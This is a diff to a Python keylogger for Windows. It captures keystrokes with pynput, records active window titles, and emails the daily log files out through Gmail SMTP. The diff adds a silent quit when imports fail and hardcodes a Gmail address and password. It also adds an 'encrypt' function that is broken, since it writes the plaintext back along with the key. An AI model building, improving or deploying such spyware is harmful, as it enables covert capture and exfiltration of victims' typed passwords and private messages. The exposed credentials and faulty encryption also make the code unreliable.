@@ -1,17 +1,20 @@
 # Import needed libraries
 # Do pip install if any library is missing on your machine.
-from datetime import datetime as dt
-from pynput.keyboard import Listener # Most important library
-from string import printable
-from win32gui import GetWindowText, GetForegroundWindow
+try:
+    from cryptography.fernet import Fernet
+    from datetime import datetime as dt
+    from pynput.keyboard import Listener # Most important library
+    from string import printable
+    from win32gui import GetWindowText, GetForegroundWindow
 
-import ctypes
-from email.mime.multipart import MIMEMultipart
-from email.mime.base import MIMEBase
-from email import encoders
-import os
-import smtplib
-
+    import ctypes
+    from email.mime.multipart import MIMEMultipart
+    from email.mime.base import MIMEBase
+    from email import encoders
+    import os
+    import smtplib
+except Exception as e:
+    quit()
 
 LETTERS = list(printable)
 path = "C:/Logs"
@@ -19,30 +22,45 @@ path = "C:/Logs"
 def get_active_window() -> str: # Get active window's title
     return GetWindowText(GetForegroundWindow())
 
-def send_mail(d : int = 1, m : int = 0):
+def encrypt_file(path : str):
+    if not os.path.exists(path):
+        return
+    with open(path, "r") as f:
+        content = f.read().encode()
+    key = Fernet.generate_key()
+    fernet = Fernet(key)
+    encContent = fernet.encrypt(content)
+    with open(path, "r+") as f:
+        f.truncate(0)
+        f.write(content.decode())
+        f.write("\n")
+        f.write(f"Key: {str(key)}")
+
+def send_mail(d : int = 1):
     # Send mail of yesterday's logs
     # In order to send mails, you have to turn less secured apps on
     # I recommend creating a new gmail account for this
     # https://myaccount.google.com/lesssecureapps
-    # d and m will be used as variables to use recursion
+    # d will be used as a variable to use recursion
     # In order to send the logs of the last day the computer was on
     # Not limiting it to yesterday's logs ONLY.
 
     year, month, day, hour, minutes, secs = get_time()
-    EMAIL = "Put your email here"
-    PASSWORD = "Put your password here"
+    EMAIL = "NavePython@gmail.com"
+    PASSWORD = "123456789Python"
     if (d > day):
-        send_mail(1, 1) # Go over last month's logs in case a new month comes in
+        return
 
-    if os.path.exists(f"{path}/{year}/{int(month) - m}/{int(day) - d}/logs.txt"):
+    if os.path.exists(f"{path}/{year}/{month}/{int(day) - d}/logs.txt"):
+        encrypt_file(f"{path}/{year}/{month}/{int(day) - d}/logs.txt")
         server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
         server.login(EMAIL, PASSWORD)
         
         message = MIMEMultipart()
         message["From"] = EMAIL
         message['To'] = EMAIL
-        message['Subject'] = f"Logs from {int(day) - d}/{int(month) - m}/{year}"
-        file = f"{path}/{year}/{int(month) - m}/{int(day) - d}/logs.txt"
+        message['Subject'] = f"Logs from {int(day) - d}/{month}/{year}"
+        file = f"{path}/{year}/{month}/{int(day) - d}/logs.txt"
         attachment = open(file,'rb')
         obj = MIMEBase('application','octet-stream')
         obj.set_payload((attachment).read())
